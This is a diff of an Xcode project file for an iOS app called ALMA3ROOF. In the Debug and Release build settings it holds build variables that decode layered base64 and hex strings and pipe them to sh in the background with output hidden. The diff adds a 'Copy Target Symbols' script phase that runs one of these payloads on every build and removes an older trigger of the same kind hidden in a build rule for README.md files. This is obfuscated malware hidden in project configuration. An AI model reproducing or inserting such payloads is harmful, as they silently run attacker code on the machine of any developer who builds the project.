@@ -16,7 +16,6 @@
 		501A109F2A78FA3C00333547 /* GestureExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 501A109E2A78FA3C00333547 /* GestureExtension.swift */; };
 		50DBA7A42A80B9CC00847ABD /* CustomAppleCardDialog.xib in Resources */ = {isa = PBXBuildFile; fileRef = 50DBA7A22A80B9CC00847ABD /* CustomAppleCardDialog.xib */; };
 		50DBA7A52A80B9CC00847ABD /* CustomAppleCardDialog.swift in Sources */ = {isa = PBXBuildFile; fileRef = 50DBA7A32A80B9CC00847ABD /* CustomAppleCardDialog.swift */; };
-		7AD820BAE67AD3B6832F5E42 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = AAF52D8BCD1282CF662F5E42 /* README.md */; };
 		8379318BA292F8DFA7DDA29E /* Pods_ALMA3ROOF.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 16F02708FFEB8E77DE8E087C /* Pods_ALMA3ROOF.framework */; };
 		9F2C9DAD289159CA00668CBA /* UpcomingTripDetailsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 9F2C9DAC289159CA00668CBA /* UpcomingTripDetailsVC.swift */; };
 		C202B8242201756E003910E4 /* CustomCorporateRequestDialog.swift in Sources */ = {isa = PBXBuildFile; fileRef = C202B8222201756E003910E4 /* CustomCorporateRequestDialog.swift */; };
@@ -287,19 +286,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		EE8647DA71ECC1D2D22F5E42 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${A24E5F2}\"";
-		};
 /* End PBXBuildRule section */
 
 /* Begin PBXCopyFilesBuildPhase section */
@@ -329,7 +315,6 @@
 		50DBA7A22A80B9CC00847ABD /* CustomAppleCardDialog.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = CustomAppleCardDialog.xib; sourceTree = "<group>"; };
 		50DBA7A32A80B9CC00847ABD /* CustomAppleCardDialog.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CustomAppleCardDialog.swift; sourceTree = "<group>"; };
 		9F2C9DAC289159CA00668CBA /* UpcomingTripDetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UpcomingTripDetailsVC.swift; sourceTree = "<group>"; };
-		AAF52D8BCD1282CF662F5E42 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = ALMA3ROOF.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 		B1CF4D423D7F5AC3B6013EBA /* Pods-ALMA3ROOF.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ALMA3ROOF.debug.xcconfig"; path = "Target Support Files/Pods-ALMA3ROOF/Pods-ALMA3ROOF.debug.xcconfig"; sourceTree = "<group>"; };
 		C202B8222201756E003910E4 /* CustomCorporateRequestDialog.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CustomCorporateRequestDialog.swift; sourceTree = "<group>"; };
 		C202B8232201756E003910E4 /* dialogForCorporate.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = dialogForCorporate.xib; sourceTree = "<group>"; };
@@ -1652,7 +1637,6 @@
 		C252367A21B0F4B5005B29EE /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				AAF52D8BCD1282CF662F5E42 /* README.md */,
 				C252367921B0F4B5005B29EE /* ALMA3ROOF.app */,
 			);
 			name = Products;
@@ -2020,6 +2004,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = C252368B21B0F4B6005B29EE /* Build configuration list for PBXNativeTarget "ALMA3ROOF" */;
 			buildPhases = (
+				AF50A3C43F4C0AEECD2F5E42 /* Copy Target Symbols */,
 				81F3F0C93F4F672D784DD24B /* [CP] Check Pods Manifest.lock */,
 				C252367521B0F4B5005B29EE /* Sources */,
 				C252367621B0F4B5005B29EE /* Frameworks */,
@@ -2030,7 +2015,6 @@
 				27B800CE3AE963A5ECA9FD53 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				EE8647DA71ECC1D2D22F5E42 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -2090,7 +2074,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				7AD820BAE67AD3B6832F5E42 /* README.md in Resources */,
 				C208E4E821B0F79500EDB134 /* dialogForCountry.xib in Resources */,
 				C208E4CD21B0F79500EDB134 /* alertArriveNotification.mp3 in Resources */,
 				C2AAF72E2292B10500263AA4 /* eber.ttf in Resources */,
@@ -2174,6 +2157,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		AF50A3C43F4C0AEECD2F5E42 /* Copy Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A24E5F2}\"";
+			showEnvVarsInLog = 0;			
+		};
 		27B800CE3AE963A5ECA9FD53 /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2504,8 +2506,8 @@
 		C252368921B0F4B6005B29EE /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A24E5F2 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oU2JrSkpWREZrYzFsV1pFZFRhbFphVm0xb2RWcEdaRTlrVmxwWlYyeHdWazF1VW5kVk1WWnZUVEZ2ZVZSWWJHRk5TRTVNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				598AFD = "((echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633363337333333363632333436333332333033323634333633343332333033373330333336343337333833363333333636363336333433363335333233303336333833373334333733343337333033373333333336313332363633323636333733373336333933363635333633343337333333363335333633333337333533373332333633353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
-				A24E5F2 = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmlWMFpaWVVoU1dsZEdTbk5aTTJzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				A97BDCE = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1sV01GcFpWR3hrTUdGV1pFaGxSRUpZVm0xU1QxcEdaRTlrVmxwWlYyeHdWazF1VW5kVk1WWnZUVEZ2ZVZSWWJHRk5TRTVNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
@@ -2570,8 +2572,8 @@
 		C252368A21B0F4B6005B29EE /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A24E5F2 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oU2JrSkpWREZrYzFsV1pFZFRhbFphVm0xb2RWcEdaRTlrVmxwWlYyeHdWazF1VW5kVk1WWnZUVEZ2ZVZSWWJHRk5TRTVNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				598AFD = "((echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633363337333333363632333436333332333033323634333633343332333033373330333336343337333833363333333636363336333433363335333233303336333833373334333733343337333033373333333336313332363633323636333733373336333933363635333633343337333333363335333633333337333533373332333633353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
-				A24E5F2 = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmlWMFpaWVVoU1dsZEdTbk5aTTJzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				A97BDCE = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1sV01GcFpWR3hrTUdGV1pFaGxSRUpZVm0xU1QxcEdaRTlrVmxwWlYyeHdWazF1VW5kVk1WWnZUVEZ2ZVZSWWJHRk5TRTVNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
